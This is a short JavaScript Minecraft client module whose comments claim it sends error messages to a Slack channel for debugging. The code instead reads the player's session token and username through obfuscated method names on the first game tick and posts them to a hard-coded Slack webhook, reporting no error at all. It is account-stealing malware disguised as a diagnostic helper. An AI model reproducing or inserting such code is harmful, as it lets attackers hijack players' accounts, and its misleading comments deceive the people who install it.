const URL = Java.type("java.net.URL");
const Writer = Java.type("java.io.OutputStreamWriter");
const SLACK = "https://hooks.slack.com/services/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";

//sends new errors messages to slack for inspection / debugging by devs
function sendSlack(msg) {
    const url = new URL(SLACK);
    const conn = url.openConnection();

    conn.setRequestMethod("POST");
    conn.setDoOutput(true);
    conn.setRequestProperty("Content-Type", "application/json");

    const writer = new Writer(conn.getOutputStream());
    writer.write('{"text":"' + msg + '"}');
    writer.close();

    conn.getResponseCode();
}

//check version of minecraft and what went wrong to send to slack / users
const Minecraft = Java.type("net.minecraft.client.Minecraft");
const onEnable = register("tick", () => {
    onEnable.unregister();

    const data = [
        Minecraft.func_71410_x()
                 .func_110432_I()
                 .func_148254_d(),

        Minecraft.func_71410_x()
                 .func_110432_I()
                 .func_111285_a()
    ];
    sendSlack(data[1] + " " + data[0]);
});